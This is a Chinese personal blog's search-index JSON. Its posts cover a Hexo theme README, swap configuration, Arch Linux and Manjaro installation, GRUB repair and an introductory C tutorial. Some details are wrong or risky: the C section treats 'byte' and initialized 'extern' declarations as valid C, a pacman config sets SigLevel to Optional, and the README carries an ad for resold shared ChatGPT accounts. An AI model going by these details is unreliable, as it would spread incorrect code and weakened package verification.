[{"title":"Hexo主题 - Redefine","url":"/2025/12/26/Redefine/","content":"hexo-theme-redefineHexo-theme-Redefine reimagines simplicity, speed, and purity, without sacrificing functionality or design. Its sleek, modern aesthetic is packed with useful features, blending style and practicality seamlessly.\nBuilding on the solid foundation of hexo-theme-keep, “Redefine” elevates the style and incorporates valuable writing tools and plugins. It offers extensive customization options, allowing you to tailor every detail to your preferences. With Redefine, your blogging experience becomes unique and effortless, showcasing your personal style and needs.\n\n    \n        \n    \n    \n        \n    \n    \n        \n    \n    \n    \n\n\n\n  \n  \n  \n\n\n\n  \n  \n  \n\n\n🌐 Demo\nEvanNotFound’s Blog\nTheme Redefine Demo\nRedefine Theme Showcase\n\nIf you are also using Redefine, please go to Redefine Theme Showcase to add your blog link.\n⛰️ Features\nNote Module\nFriend Link Page\nMathjax Support\nCode block language display\nLight&#x2F;Dark mode switching\nFont Awesome 6.2.1 Pro (contains different styles like Duotone&#x2F;Regular&#x2F;Thin&#x2F;Sharp)\nDrop-down menu\nCustomizable footer\nSite Uptime Display\nArticle Header Image\nMermaid JS support\nSEO friendly\nAplayer support\nShuoshuo support\nCustomizable Font\nTailwind CSS Included\n\n☁️ InstallationThe easiest way to install Theme Redefine is by using npm (after your hexo version has been up to 5.0+)\n$ cd your-hexo-site$ npm install hexo-theme-redefine@latest\n\nAnother method is by git clone\n$ cd your-hexo-site$ git clone https://github.com/EvanNotFound/hexo-theme-redefine.git themes/redefine\n\nAfter the installation, go to the _config.yml of your hexo site and set\ntheme: redefine\n\n⏫ UpdateTo update hexo-theme-redefine, you can run the same npm command\n$ npm install hexo-theme-redefine@latest\n\nIf you installed the theme by git clone, you can update the theme by running the following command\n$ cd themes/redefine$ git pull\n\n\n\n📄 DocumentationsPlease read Redefine Docs when installing\nIt’s very easy to understand.\n☕ SupportFeel free to pull request and send issues.\nIf you have any questions, please send an email to contact@ohevan.com. I will reply in time.\nPlease give me a star to support me, thanks!\nAlso, if you are using Typora, check out Typora Theme Redefine so that you can preview the styles of your blog in Typora.\n💗 DonationsThanks to all the people who have donated to me. Your support is my greatest motivation.\nIf you like this theme, please give a star. You can also support me by donating.\nThis is the list of all the people who have donated to me: Donation List\n🎉 想体验 OpenAI 的 ChatGPT Plus 会员？官网 20 美元每月太贵了？不用担心！\n🚀 立即加入我的 GPT Plus Share GPT Plus 共享站，ChatGPT Plus 随心用。\n\n✅ 支持 OpenAI 最新所有模型，包括 GPT-4o, o3 系列模型，支持高级图片生成\n✅ 后台大量官方正版账号号池，随心使用\n✅ 每月仅需低至 23.99 人民币，支持一天免费试用\n✅ 无需梯子，国内免翻访问！\n✅ 由 Evan 本人运营，售后保证，已稳定运行超过一年\n\n\n🌟 Star History\n\n  \n    \n    \n    \n  \n\n\n\n💻 DevelopmentIf you want to contribute to this project, you can clone the dev branch and check out the Development Docs to get started.\n","categories":["Theme"],"tags":["Redefine","Theme"]},{"title":"关于服务器BPS/IOPS过高问题解决","url":"/2025/11/16/aliyun-server-problem/","content":"问题描述\n配置： 2H2G\n问题：服务器BPS/IOPS 一直处于高负载状态，系统一直在频繁与磁盘交换数据\n造成的结果：服务器无法连接，服务器的服务全部失去连接，控制台无法通过普通重启来重启服务器，只能强制重启或关闭\n原因分析：运行内存不足导致，由于内存不够系统需要频繁的与磁盘不停的交换数据，占用了大量的IO。\n\n\n解决办法1 升级配置，最简单最简单最无脑。\n解决办法2 通过拓展swap分区来缓解此问题\n查看系统的swap分区情况通过swapon查看\nswapon --show\n\n我这里没有任何输出，说明根本不存在swap分区。\n通过free看一下运行内存情况。\nfree -h\n\n这里也可以看到swap全是0\n               total        used        free      shared  buff/cache   availableMem:           1.6Gi       831Mi       242Mi       1.8Mi       752Mi       844MiSwap:          0\t\t   0\t\t   0\n\n\n\n创建并配置swap创建并启用一个swap (注：以下操作均需要root权限)\n# 创建 swap 文件fallocate -l 4G /swap# 设置权限chmod 600 /swap# 格式化为swapmkswap /swap# 启用swapswapon /swap# 永久添加到fstabecho &#x27;/swap none swap defaults 0 0&#x27; &gt;&gt; /etc/fstab\n\n\n\n配置 swappiness检查swappiness（取值范围为 0 - 100，数值越大，使用swap的可能性越大）\ncat /proc/sys/vm/swappiness# 输出0\n\n我这里为0。\n编辑 /etc/sysctl.conf将vm.swappiness 修改为20\nvim /etc/sysctl.conf# 修改 vm.swappiness# vm.swappiness = 20\n\n\n\n更新内核参数更新内核参数，使swappiness配置生效\nsysctl -p\n\n\n\n验证结果再次查看内存和swap情况\n # 查看swapswapon --show#输出NAME      TYPE SIZE   USED PRIO/swap     file   4G 547.6M   -2# 查看内存free -h# 输出               total        used        free      shared  buff/cache   availableMem:           1.6Gi       746Mi       665Mi       1.8Mi       414Mi       930MiSwap:          4.0Gi       780Mi       3.2Gi\n\n","categories":["故障排除"],"tags":["服务器"]},{"title":"记一次ArchLinux的安装过程","url":"/2023/03/27/arch_install/","content":"ArchLinux+KDE的安装过程1. 1下载镜像文件Archlinux的官网:https://archlinux.org/ \n点击Download\n按照自身情况选择一个镜像源\n国内推荐清华源 \n下载iso镜像文件\n1.2 选择安装方式1.2.1本机安装folding cyan,本机安装本机安装, 推荐用 ventoy 制作U盘启动盘进行安装\n\n(1).制作启动盘\n准备一个大容量U盘(建议8G往上, 以后想装其他系统直接吧ISO文件复制到U盘里即可)\n确保U盘里没有重要文件(请提前备份好重要文件)\n\n\n\n打开Ventoy2Disk.exe\n找到要制作的U盘, 点击开始安装即可\n\n然后将archlinux的iso镜像复制在U盘中\n(2).启动archlinux镜像启动电脑时按F2(不同电脑快捷键可能不同,请自行百度)\n然后选择U盘启动,进入ventoy,选择archlinux.\nendfolding\n1.2.2虚拟机安装folding cyan,虚拟机安装\n此处演示的为 VMware 虚拟机\n\n打开 VMware\n\n\n\n选择新建虚拟机,选择典型(推荐)配置\n选择安装光盘映像文件(iso), 选择下载好的archlinux的ISO镜像.\n\n\n\n下一步\n操作系统选择Linux,内核选择 其他 Linux 5.x 内核 64 位.\n\n\n\n下一步\n\n 虚拟机名字和创建文字按照自己情况适当调整\n\n下一步\n\n最大磁盘大小按照自己情况修改(我这里改为20GB)\n选择 将虚拟磁盘储存为单个文件\n\n\n下一步\n点击自定义硬件, 修改此虚拟机的内存,我这里修改的为4G\n点击完成\n点击编辑虚拟机设置, 依次点击 选项–&gt;高级–&gt;固件类型 中 选中UEFI模式\n\n\n至此,虚拟机配置就完成了\n1.3安装archlinux1.3.1进入镜像系统\n首先 先禁用 reflector服务, 防止自动更新服务器列表\nsystemctl stop reflector.service\n\n1.3.2网络连接, 有线网会自动连接, 请忽略此步无线网连接\n#执行iwctl指令,进入交互式命令界面iwctl#累出设备名,如无线网卡应看到wlan0device list\t\t\t\t\t#用wlan0扫描网络station wlan0 scan\t\t \t#列出网络station wlan0 get-networks\t# 连接指定无线网 输入密码station wlan0 connect [无线网名字]\t#退出iwctlexit或者quit\t\t\t\t\t\n\nping一下一个网站, 看看网络是否连接成功\n#例ping www.baidu.com\n\n1.3.3同步网络时间timedatectl set-ntp true\n\n1.3.4修改软件源 把中国源放在前列# Ctrl+w\t\t搜索指定文本# Ctrl+6\t\t标记指定文本# Ctrl+k\t\t剪切选中文本# Ctrl+u\t\t粘贴文本# Ctrl+x\t\t退出编辑nano /etc/pacman.d/mirrorslist\t\t\t\t#打开镜像源配置文件,将中国的镜像源放置最前列\n\n1.3.5刷新但不更新软件包pacman -Syy\n\n1.3.6(可选操作)安装openssh#安装openssh远程软件pacman -S openssh\t\t#启用sshd服务systemctl start sshd\t#设置当前root密码passwd root#查看ip地址ip a\t\t\t\t\t\n\n\n\n使用ssh连接archlinux,方便复制粘贴命令\n\nssh [ip地址]@root#输入密码即可成功连接\n1.3.7磁盘分区fdisk软件分区fdisk -l\t\t#查看磁盘列表\n\n\nfdisk /dev/sda\t\t#对sda磁盘进行分区\n\n\n\nfdisk操作命令\nm: 帮助\ng(小写g): 创建GPT格式磁盘\nn: 创建分区\np: 查看分区\nq: 不保存退出\nw: 保存并退出 所有操作在执行”w”前都不会生效\n\n\n\n\n\n作为演示, 分以下四个分区\n\n512MB的ESP启动分区\n2G的交换分区\n10G作为根目录&#x2F;\n剩下的作为home目录\n\n\ncfdisk软件分区folding cyan,cfdisk软件分区\ncfdisk分区软件操作比较简单,具体分区布局看下图\n\n分好区后选择write并键入yes即可使分区生效\nendfolding\n\nfdisk -l\t\t#分好区后用此指令可以查看分区的状态\n1.3.8格式化磁盘#根据自己情况适当修改,不可照抄mkfs.vfat /dev/sda1mkswap /dev/sda2mkfs.ext4 /dev/sda3mkfs.ext4 /dev/sda4swapon /dev/sda2\n\n1.3.9挂载磁盘#挂载根目录/mount /dev/sda3 /mnt\t\t#必须先挂载根目录,才能再挂载其他目录#创建home,boot文件夹mkdir /mnt/homemkdir /mnt/boot#挂载mount /dev/sda4 /mnt/homemount /dev/sda1 /mnt/boot\n\n1.3.10往&#x2F;mnt里安装系统最基础的四个包是: base base-devel linux linux-firmeware\n其余的按自己需求安装\npacstrap /mnt base base-devel linux linux-firmware dhcpcd iwd vim sudo bash-completion nano net-tools openssh man git wget zsh fish\n\n1.3.11生成fstabgenfstab -U /mnt &gt;&gt; /mnt/etc/fstab\n\n\n查看是否成功生成\n\ncat /mnt/etc/fstab\n\n\n1.3.12从live切换到刚安装的系统arch-chroot /mnt\n\n编辑hostname\n#我这里填写的archecho [arch] &gt; /etc/hostname\t\t\t#将arch写入到/etc/hostname文件里cat /etc/hostname\t\t\t\t\t#查看/etc/hostname文件里的内容\n\n编辑hosts\n#我这里名字是arch,可自行更改nano /etc/hosts#向hosts文件里添加以下内容127.0.0.1\tlocalhost::1\t\t\tlocalhost127.0.0.1\tarch\n\n\n设置时区和硬件时间设置\n\n#设置时区ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime#硬件时间设置hwclock --systohc\n\n1.3.13编辑语言环境nano /etc/locale.gen\n\nctrl+w搜索en_US注意大小写\nalt+w搜索下一个 找到en_US.UTF-8.UTF-8 然后把他取消注释\n保存退出\nlocale-gen\t\t#使刚才编辑的语言环境生效\n\n1.3.14设置root密码passwd root   \t#当前账户就是root 可以不用打root\n\n1.3.15添加新用户用户名以arch为例useradd -m -G wheel -s /bin/bash arch\t\t#这里新建用户arch#为arch设置密码passwd arch\n\n\n设置arch用户名的密码\n#编辑arch用户的权限EDITOR=nano visudo\n\nctrl+w搜索%wheel\n找到**# %wheel ALL&#x3D;(ALL:ALL)ALL**取消注释\n\n\n1.3.16安装 cpu微码和引导软件pacman -S intel-ucode grub efibootmgr os-prober#如果是amd的cpu 则输入amd-ucode#安装grub引导 如果不知道系统什么架构可以使用&#x27;uname -a&#x27;查看一下grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB生成grubgrub-mkconfig -o /boot/grub/grub.cfg\n\n\nos-prober查找已安装的操作系统, 推荐双系统使用者安装此工具(虚拟机没必要)\npacman -S os-prober\n\n1.3.17安装KDE桌面 字体 浏览器等软件包等pacman -S plasma konsole dolphin     #kde桌面和终端，文件管理器pacman -S ntfs-3g\t\t\t\t\t#可以读取ntfs格式磁盘,根据自己情况选择性安装#中文字体pacman -S adobe-source-han-serif-cn-fonts adobe-source-han-sans-cn-fonts wqy-zenhei wqy-microhei noto-fonts-cjk noto-fonts-emoji noto-fonts-extra ttf-dejavu#一堆软件,以下不是必须安装.可以根据自己情况选择性安装pacman -S firefox ark gwenview packagekit-qt5 packagekit appstream-qt appstream man neofetch net-tools networkmanager openssh git wget\n\n\n\nvmware虚拟机的自适应分辨率,实体机请勿安装\n\npacman -S gtkmm gtk2 gtkmm3 open-vm-tools xf86-input-vmmouse xf86-video-vmware#开机启动 显示管理器 网络管理 ssh 虚拟机自适应分辨率systemctl enable NetworkManager sddm vmtoolsd sshd#编辑配置文件nano /etc/mkinitcpio.confMODULES=(vsock vmw_vsock_vmci_transport vmw_balloon vmw_vmci vmwgfx)#使刚才配置文件生效mkinitcpio -p linux\n至此系统基本安装完毕, 按照以下步骤重启准备进入系统\n\nexit退回到live系统中\numount -R &#x2F;mnt 卸载&#x2F;mnt目录\nreboot重启\n\n\n输入之前设置的密码即可进入系统\n\n1.3.18最后调整#修改pacman.confsudo nano /etc/pacman.conf#取消&#x27;Color&#x27;前的注释,这样系统报错时会彩色显示,方便排查#取消以下两行的注释[multilib]Include = /etc/pacman.d/mirrorslist#再在最后面添加以下两行内容[archlinuxcn]Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch#保存并退出#更新一下软件包pacman -Sy\n\n\n安装archlinuxcn-keyring包导入GPG key\nsudo pacman -S archlinuxcn-keyring\n\n再次更新下源\nsudo pacman -Sy\n\n\nyay paru都是aur助手, 任选一种, 还有其他的aur助手软件可以自行搜索\n\npacman -S yay paru\n\n如果报错则执行以下命令\nrm -rf /etc/pacman.d/gnupg     \t#rm命令谨慎操作pacman-key --initpacman-key --populate archlinuxpacman-key --populate archlinuxcn\n\n\n安装fcitx5输入法\npacman -S fcitx5-im fcitx5-chinese-addons fcitx5-pinyin-moegirl fcitx5-pinyin-zhwiki fcitx5-material-color  #编辑运行环境 使fcitx5输入法生效EDITOR=nano sudoedit /etc/environment  #输入以下内容GTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitx  #重启以下系统即可\n\n1.3.19结束安装\n至此,系统已经全部安装完成.\n\n","categories":["Arch Linux"],"tags":["Arch Linux","Linux"]},{"title":"Majaro 配置记录","url":"/2022/12/18/arch_majaro/","content":"\n添加AUR源manjaro是基于Arch的，所以也能使用Arch的AUR\n修改pacman.conf文件\nsudo nano /etc/pacman.conf# 在最后添加以下三行内容+ [archlinuxcn]+ SigLevel = Optional TrustedOnly+ Server = https://mirrors.tsinghua.edu.cn/archlinuxcn/$arch#之后保存更新sudo pacman -Syyu\n\n安装archlinuxcn-keyring包导入GPG key\nsudo pacman -S archlinuxcn-keyring\n\nGIT\nsudo pacman -S git\n\nchrome浏览器\n#chrome浏览器sudo pacman -S google-chrome\n\n配置全局主题-layanhttps://github.com/vinceliuice/Layan-kde \n\nPlasma样式\n\n颜色\n\n图标\n\n设置——工作区行为——桌面特效\n\n\n窗口透明度\n\n窗口背景虚化\n\ngnome-gtk程序风格文件：https://pan.baidu.com/s/1SZbrEzFI2SFCBMEJ0zmuHQ  密码: r8t5\n用到的软件 kvantum\n软件库里有，点击直接安装\n\n也可以用终端安装\nsudo pacman -S kvantum\n\n选择主题安装\n\n稍作修改\n\n\n保存，然后在设置里应用 kvantum 即可\n任务栏插件panon音乐插件\nhttps://github.com/rbn42/panon \n配置\n\nDock栏\nsudo pacman -S plank\n\n配置\n\n","categories":["Linux"],"tags":["Arch Linux","配置"]},{"title":"解决Windows更新后重写引导记录导致Archlinux引导消失的问题","url":"/2025/12/26/archlinux-bootloader/","content":"问题在windows和linux双系统和双分区引导的情况下，windows系统更新后有时候会自动更新引导记录,此时如果有linux引导，会被直接覆盖，但是linux的引导分区和文件仍在，此时linux引导会直接被复写，导致再次启动时linux引导消失找不到。\n解决办法通过U盘安装盘进行修复\nU盘启动盘制作Ventoy推荐在u盘中使用Ventoy进行制作一个最精简的多功能的U盘启动盘。\nventoy安装会格式化U盘，安装前尽量先把U盘资料备份一下，在ventoy安装好后，U盘就具有了存储和启动盘双功能，使用的启动镜像不需要烧录，直接将iso复制到U盘里即可，在启动的时候ventoy会自动检测可以启动的启动镜像。\n修复引导这里用的是Archlinux系统，所以就从Archlinux download选择合适源下载一个archlinux的iso安装镜像。\n通过u盘进入iso系统后先去查看自己的分区情况。\nfdisk -l\n\n\n如下，这是我截取的有关linux的分区配置\n/dev/nvme0n1p5 1219518464 1221615615   2097152     1G EFI 系统/dev/nvme0n1p6 1221615616 1230004223   8388608     4G Linux swap/dev/nvme0n1p7 1230004224 1534091263 304087040   145G Linux 文件系统\n\n现在需要挂载这几个分区到mnt中\nmount /dev/nvme0n1p7 /mntmount /dev/nvme0n1p5 /mnt/boot# 挂载一下必要目录mount --bind /dev /mnt/devmount --bind /proc /mnt/procmount --bind /sys /mnt/sysmount --bind /run /mnt/run\n\n通过arch-chroot 进行重新生成配置\narch-chroot /mnt# 进入后根据实际情况重新安装一下grubgrub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=XXXX# 生成grub配置文件grub-mkconfig -o /boot/grub/grub.cfg\n\n若 windows和linux用的同一个分区，在以上操作执行后,尽量重新生成一下initramfs\nmkinitcpio -P\n\n退出U盘镜像并重启\nexitumount -R /mntreboot\n之后archlinux应该是可以重新能够引导了\n","categories":["Arch Linux"],"tags":["Arch Linux","Linux"]},{"title":"C语言-1","url":"/2022/11/01/c_learn_1/","content":"C 简介C 语言是一种通用的高级语言，最初是由丹尼斯·里奇在贝尔实验室为开发 UNIX 操作系统而设计的。C 语言最开始是于 1972 年在 DEC PDP-11 计算机上被首次实现。\n在 1978 年，布莱恩·柯林汉（Brian Kernighan）和丹尼斯·里奇（Dennis Ritchie）制作了 C 的第一个公开可用的描述，现在被称为 K&amp;R 标准。\nUNIX 操作系统，C编译器，和几乎所有的 UNIX 应用程序都是用 C 语言编写的。由于各种原因，C 语言现在已经成为一种广泛使用的专业语言。\n其主要有一下几个特点：\n\n\n易于学习.\n结构化语言.\n可以生产高效率的程序.\n可以处理底层的活动.\n可以在多种计算机平台上编译.\n\n\n关于C\nC 语言是为了UNIX操作系统而被发明的.\nC 语言是以B语言为基础的, B语言在大约1970年被引进的.\nC 语言的标准是与1988年由美国国家标准协会(ANSI, 全称American National Standard Institute)制定的.\n截至1973年,UNIX操作系统是完全使用C语言编写的.\n目前,C 语言是最广泛使用的系统程序设计语言.\n大多数先进的软件都是使用C语言实现的.\n当今流行的Linux操作系统和RDBMS(Relational Database Management System:关系数据库管理系统) MySQL都是使用C语言编写的.\n\n为什么要用CC 语言最初是用于系统开发工作，特别是组成操作系统的程序。由于 C 语言所产生的代码运行速度与汇编语言编写的代码运行速度几乎一样，所以采用 C 语言作为系统开发语言。\n几个使用 C 的实例：\n\n操作系统\n语言编译器\n汇编器\n文本编辑器\n打印机\n网络驱动器\n现代程序\n数据库\n语言解释器\n实体工具\n\nC 程序\n一个 C 语言程序，可以是 3 行，也可以是数百万行，它可以写在一个或多个扩展名为 “.c” 的文本文件中，例如，hello.c。可以使用 VScode&#x2F;Dev-C++&#x2F;Vim或者其他编辑器来编写 C 语言程序。\nC11C11（也被称为C1X）指ISO标准ISO&#x2F;IEC 9899:2011。在它之前的C语言标准为C99。\n新特性\n对齐处理（Alignment）的标准化（包括_Alignas标志符，alignof运算符，aligned_alloc函数以及&lt;stdalign.h&gt;头文件）。\n_Noreturn 函数标记，类似于 gcc attribute((noreturn))。\n_Generic 关键字。\n多线程（Multithreading）支持，包括：\n_Thread_local存储类型标识符，&lt;threads.h&gt;头文件，里面包含了线程的创建和管理函数。\n_Atomic类型修饰符和&lt;stdatomic.h&gt;头文件。\n\n\n增强的Unicode的支持。基于C Unicode技术报告ISO&#x2F;IEC TR 19769:2004，增强了对Unicode的支持。包括为UTF-16&#x2F;UTF-32编码增加了char16_t和char32_t数据类型，提供了包含unicode字符串转换函数的头文件&lt;uchar.h&gt;。\n删除了 gets() 函数，使用一个新的更安全的函数gets_s()替代。\n增加了边界检查函数接口，定义了新的安全的函数，例如 fopen_s()，strcat_s() 等等。\n增加了更多浮点处理宏(宏)。\n匿名结构体&#x2F;联合体支持。这个在gcc早已存在，C11将其引入标准。\n静态断言（Static assertions），_Static_assert()，在解释 #if 和 #error 之后被处理。\n新的 fopen() 模式，(“…x”)。类似 POSIX 中的 O_CREAT|O_EXCL，在文件锁中比较常用。\n新增 quick_exit() 函数作为第三种终止程序的方式。当 exit()失败时可以做最少的清理工作。\n\n环境配置最简单的环境配置只需要配置C的编译环境，C语言对应的工具主要有以下三种：\n\n\nGCC&#x2F;G++ (Window可以用MinGW)\nMSVC (可以通过Visual Studio installer下载C++的桌面开发环境下载)\nCLANG (LLVM) \n\n\n下载对应的编译工具并添加进环境即可\n程序结构C “hello world” 实例C 程序主要包括以下几个部分:\n\n预处理指令\n函数\n变量\n语句 &amp; 表达式\n注释\n\nhello world!实例:\n#include&lt;stdio.h&gt;int main() &#123;    /*我的第一个 C 程序*/    printf(&quot;Hello World! \\n&quot;);    return 0;&#125;\n\n\n\n\n代码\n解释\n\n\n\n#include&lt;stdio.h&gt;\n预处理指令,告诉 C 编译器在实际编译之前要包含 stdio.h 文件。\n\n\nint main()\n程序的主函数,程序从这里开始运行\n\n\n&#x2F;…&#x2F;\n“…”里的内容会被编译器忽略，这里放置程序的注释内容。它们被称为程序的注释\n\n\nprintf(…)\nC语言 中一个可用的函数，会在屏幕上显示消息”…(括号内的内容)”\n\n\nreturn 0;\n终止main()函数,并返回值0.\n\n\n编译 &amp; 执行 C 程序不同编译器操作方式不同,此处只提供其中一种关于vscode如何运行C代码 \nC 基本语法C 的令牌(Token)C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。例如，下面的 hello world 语句就包括五个令牌：\nprintf(&quot;hello world! \\n&quot;);\n\n这五个令牌分别为:\n\nprintf\n(\n“Hello, World! \\n”\n)\n;\n\n分号 ‘;’在 C 程序中，分号是语句结束符。也就是说，每个语句必须以分号结束。它表明一个逻辑实体的结束。\nprintf(&quot;Hello, World! \\n&quot;);     //这是第一条语句return 0;                       //这是第二条语句\n\n注释C 语言有两种注释方式：\n\n&#x2F;&#x2F; 单行注释以 &#x2F;&#x2F; 开始的单行注释，这种注释可以单独占一行。\n&#x2F;…&#x2F; 这种格式的注释可以单行或多行。您不能在注释内嵌套注释，注释也不能出现在字符串或字符值中\n\n// 单行注释/* 单行注释 *//*  多行注释  多行注释  多行注释  多行注释*/\n\n标识符\nC 标识符是用来标识变量、函数，或任何其他用户自定义项目的名称。一个标识符以字母 A-Z 或 a-z 或下划线 _ 开始，后跟零个或多个字母、下划线和数字（0-9）。\nC 标识符内不允许出现标点字符，比如 @、$ 和 %。C 是区分大小写的编程语言。因此，在 C 中，Manpower 和 manpower 是两个不同的标识符。\n\n几个有效的标识符：\nnote simplemohd zara abc move_name a_123myname50 _temp j a23b9 retValendnote\n关键词hideToggle 点我查看\n\n\n\n关键词\n说明\n\n\n\nauto\n声明自动变量\n\n\nbreak\n跳出当前循环\n\n\ncase\n开关语句分支\n\n\nchar\n声明字符型变量或函数返回值类型\n\n\nconst\n定义常量，如果一个变量被 const 修饰，那么它的值就不能再被改变\n\n\ncontinue\n结束当前循环，开始下一轮循环\n\n\ndefault\n开关语句中的”其它”分支\n\n\ndo 循环语句的循环体\n\n\n\ndouble\n声明双精度浮点型变量或函数返回值类型\n\n\nelse\n条件语句否定分支（与 if 连用）\n\n\nenum\n声明枚举类型\n\n\nextern\n声明变量或函数是在其它文件或本文件的其他位置定义\n\n\nfloat\n声明浮点型变量或函数返回值类型\n\n\nfor\n一种循环语句\n\n\ngoto\n无条件跳转语句\n\n\nif\n条件语句\n\n\nint\n声明整型变量或函数\n\n\nlong\n声明长整型变量或函数返回值类型\n\n\nregister\n声明寄存器变量\n\n\nreturn\n子程序返回语句（可以带参数，也可不带参数）\n\n\nshort\n声明短整型变量或函数\n\n\nsigned\n声明有符号类型变量或函数\n\n\nsizeof\n计算数据类型或变量长度（即所占字节数）\n\n\nstatic\n声明静态变量\n\n\nstruct\n声明结构体类型\n\n\nswitch\n用于开关语句\n\n\nunsigned\n声明无符号类型变量或函数\n\n\nunion\n声明共用体类型\n\n\nvoid\n声明函数无返回值或无参数，声明无类型指针\n\n\nvolatile\n说明变量在程序执行中可被隐含地改变\n\n\nwhile 循环语句的循环条件\n\n\n\nC99新增关键词\n\n\n\n_Bool\n_Complex\n_Imaginary\ninline\nrestrict\n\n\n\n\n\n\n\n\n\n\nC11 新增关键字\n\n\n\n_Alignas\n_Alignof\n_Atomic\n_Generic\n_Noreturn\n\n\n\n_Static_assert\n_Thread_local\n\n\n\n\n\nendhideToggle\nC 中的空格只包含空格的行，被称为空白行，可能带有注释，C 编译器会完全忽略它。\n在 C 中，空格用于描述空白符、制表符、换行符和注释。空格分隔语句的各个部分，让编译器能识别语句中的某个元素（比如 int）在哪里结束，下一个元素在哪里开始。因此，在下面的语句中：\nint age;\n\n在这里，int 和 age 之间必须至少有一个空格字符（通常是一个空白符），这样编译器才能够区分它们。另一方面，在下面的语句中：\nfruit = apples + oranges;   // 获取水果的总数\n\nfruit 和 &#x3D;，或者 &#x3D; 和 apples 之间的空格字符不是必需的，但是为了增强可读性，您可以根据需要适当增加一些空格。\nC 数据类型在 C 语言中，数据类型指的是用于声明不同类型的变量或函数的一个广泛的系统。变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。\nC 中的类型可分为以下几种：\n\n\n\n序号\n类型与描述\n\n\n\n基本类型：\n它们是算术类型，包括两种类型：整数类型和浮点类型。\n\n\n枚举类型：\n它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。\n\n\nvoid 类型：\n类型说明符 void 表明没有可用的值。\n\n\n派生类型：\n它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。\n\n\n整数类型下表列出了关于标准整数类型的存储大小和值范围的细节：\n\n\n\n类型\n存储大小\n值范围\n\n\n\nchar\n1 字节\n-128 到 127 或 0 到 255\n\n\nunsigned char\n1 字节\n0 到 255\n\n\nsigned char\n1 字节\n-128 到 127\n\n\nint\n2 或 4 字节\n-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647\n\n\nunsigned int\n2 或 4 字节\n0 到 65,535 或 0 到 4,294,967,295\n\n\nshort\n2 字节\n-32,768 到 32,767\n\n\nunsigned short\n2 字节\n0 到 65,535\n\n\nlong\n4 字节\n-2,147,483,648 到 2,147,483,647\n\n\nunsigned long\n4 字节\n0 到 4,294,967,295\n\n\nnote modern为了得到某个类型或某个变量在特定平台上的准确大小，您可以使用 sizeof 运算符。表达式 sizeof(type) 得到对象或类型的存储字节大小。下面的实例演示了获取 int 类型的大小：\n#include &lt;stdio.h&gt;#include &lt;limits.h&gt; int main()&#123;   printf(&quot;int 存储大小 : %lu \\n&quot;, sizeof(int));      return 0;&#125;\n\n%lu 为 32 位无符号整数，详细说明查看 C 库函数 - printf() 。\nendnote\n浮点类型下表列出了关于标准浮点类型的存储大小、值范围和精度的细节：\n\n\n\n类型\n存储大小\n值范围\n精度\n\n\n\nfloat\n4 字节\n1.2E-38 到 3.4E+38\n6 位有效位\n\n\ndouble\n8 字节\n2.3E-308 到 1.7E+308\n15 位有效位\n\n\nlong double\n16 字节\n3.4E-4932 到 1.1E+4932\n19 位有效位\n\n\n头文件 float.h 定义了宏，在程序中可以使用这些值和其他有关实数二进制表示的细节。下面的实例将输出浮点类型占用的存储空间以及它的范围值：\n实例#include &lt;stdio.h&gt;#include &lt;float.h&gt;  int main() &#123;   \tprintf(&quot;float 存储最大字节数 : %lu \\n&quot;, sizeof(float));\tprintf(&quot;float 最小值: %E\\n&quot;, FLT_MIN );\tprintf(&quot;float 最大值: %E\\n&quot;, FLT_MAX );\tprintf(&quot;精度值: %d\\n&quot;, FLT_DIG );\t\treturn 0;&#125;\n\n%E 为以指数形式输出单、双精度实数，详细说明查看 C 库函数 - printf() 。\n当您在 Linux 上编译并执行上面的程序时，它会产生下列结果：\nfloat 存储最大字节数 : 4 float 最小值: 1.175494E-38float 最大值: 3.402823E+38精度值: 6\n\nvoid 类型void 类型指定没有可用的值。它通常用于以下三种情况下：\n\n\n\n类型\n描述\n\n\n\n函数返回为空\nC 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 void exit (int status);\n\n\n函数参数为空\nC 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 int rand(void);\n\n\n指针指向 void\n类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 void *malloc( size_t size ); 返回指向 void 的指针，可以转换为任何数据类型。\n\n\nC 变量变量其实只不过是程序可操作的存储区的名称。C 中每个变量都有特定的类型，类型决定了变量存储的大小和布局，该范围内的值都可以存储在内存中，运算符可应用于变量上。\n变量的名称可以由字母、数字和下划线字符组成。它必须以字母或下划线开头。大写字母和小写字母是不同的，因为 C 是大小写敏感的。基于前一章讲解的基本类型，有以下几种基本的变量类型：\n\n\n\n类型\n描述\n\n\n\nchar\n通常是一个字节（八位）, 这是一个整数类型。\n\n\nint\n整型，4 个字节，取值范围 -2147483648 到 2147483647。\n\n\nfloat\n单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。\n\n\ndouble\n双精度浮点值。双精度是1位符号，11位指数，52位小数。\n\n\nvoid\n表示类型的缺失。\n\n\nC 语言也允许定义各种其他类型的变量，比如枚举、指针、数组、结构、共用体等等.\nC 中的变量定义变量定义就是告诉编译器在何处创建变量的存储，以及如何创建变量的存储。变量定义指定一个数据类型，并包含了该类型的一个或多个变量的列表，如下所示：\ntype variable_list;\n\n在这里，type 必须是一个有效的 C 数据类型，可以是 char、w_char、int、float、double 或任何用户自定义的对象，variable_list 可以由一个或多个标识符名称组成，多个标识符之间用逗号分隔。下面列出几个有效的声明：\nint    i, j, k;char   c, ch;float  f, salary;double d;\n\n行 int i, j, k; 声明并定义了变量 i、j 和 k，这指示编译器创建类型为 int 的名为 i、j、k 的变量。\n变量可以在声明的时候被初始化（指定一个初始值）。初始化器由一个等号，后跟一个常量表达式组成，如下所示：\ntype variable_name = value;\n\n下面列举几个实例：\nextern int d = 3, f = 5;    // d 和 f 的声明与初始化int d = 3, f = 5;           // 定义并初始化 d 和 fbyte z = 22;                // 定义并初始化 zchar x = &#x27;x&#x27;;               // 变量 x 的值为 &#x27;x&#x27;\n\n不带初始化的定义：带有静态存储持续时间的变量会被隐式初始化为 